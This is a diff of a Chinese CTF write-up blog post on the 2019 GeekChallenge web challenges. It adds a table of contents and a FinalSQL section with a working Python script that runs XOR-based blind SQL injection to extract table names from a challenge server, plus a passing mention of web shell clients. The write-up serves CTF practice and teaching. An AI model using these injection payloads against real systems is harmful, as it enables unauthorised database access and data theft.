@@ -6,6 +6,25 @@ categories: CTF做题记录
 ---
 
 > 仅为做题思路，记下笔记，如有错误烦请斧正
+
+<!-- TOC -->
+
+- [[极客大挑战 2019]EasySQL](#极客大挑战-2019easysql)
+- [[极客大挑战 2019]Havefun](#极客大挑战-2019havefun)
+- [[极客大挑战 2019]Secret](#极客大挑战-2019secret)
+- [[极客大挑战 2019]LoveSQL](#极客大挑战-2019lovesql)
+- [[极客大挑战 2019]Http](#极客大挑战-2019http)
+- [[极客大挑战 2019]BabySQL](#极客大挑战-2019babysql)
+- [[极客大挑战 2019]BuyFlag](#极客大挑战-2019buyflag)
+- [[极客大挑战 2019]Upload](#极客大挑战-2019upload)
+- [[极客大挑战 2019]HardSQL](#极客大挑战-2019hardsql)
+- [[极客大挑战 2019]FinalSQL](#极客大挑战-2019finalsql)
+- [[极客大挑战 2019]Knife](#极客大挑战-2019knife)
+- [[极客大挑战 2019]RCE ME](#极客大挑战-2019rce-me)
+- [[极客大挑战 2019]PHP](#极客大挑战-2019php)
+
+<!-- /TOC -->
+
 <!--more-->
 ---
 # [极客大挑战 2019]EasySQL
@@ -168,9 +187,38 @@ autsword或者菜刀连接，文件太多了，用终端找flag，` find / -name
 
 ---
 # [极客大挑战 2019]FinalSQL
-五个选项都没啥用，fuzz一下，过滤了不少东西
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20200517101701266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70)
+随便点进去一个页面，id可能sql注入，fuzz\
+![fuzz](https://raw.githubusercontent.com/yq1ng/blog/master/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019/image.png)\
+根据题目盲注，又过滤了`union`，应该就是异或注入了，本来想偷懒用大佬的脚本，但是复现失败，flag跑不对，字段太长了后面有误差，但是大佬们直接跑出来全部字段了。。菜鸡自己写个垃圾脚本，用了`length()`和`right()`.
+`id=1^1`ERROR；`id=1^0`SUCCESS -->  数字型注入
+```python
+import requests
+url = 'http://c74f4cb6-6b98-4b75-b147-9a4a127baca6.node3.buuoj.cn/search.php'
+flag = ''
+for i in range(1,250):
+    low = 32
+    high = 128
+    mid = (low+high)//2
+    while(low<high):
+        
+        payload = "?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))>%d)^1" %(i,mid)
+        res = requests.get(url + payload)
+        print(payload)
+        if 'Click' in res.text:
+            low = mid+1
+        else:
+            high = mid
+        mid = (low+high)//2
+    if(mid ==32 or mid ==127):
+        break
+    flag = flag+chr(mid)
+    print(flag)
+```
 
 
-# 暂更
+# [极客大挑战 2019]Knife
 
+
+# [极客大挑战 2019]RCE ME
+
+# [极客大挑战 2019]PHP
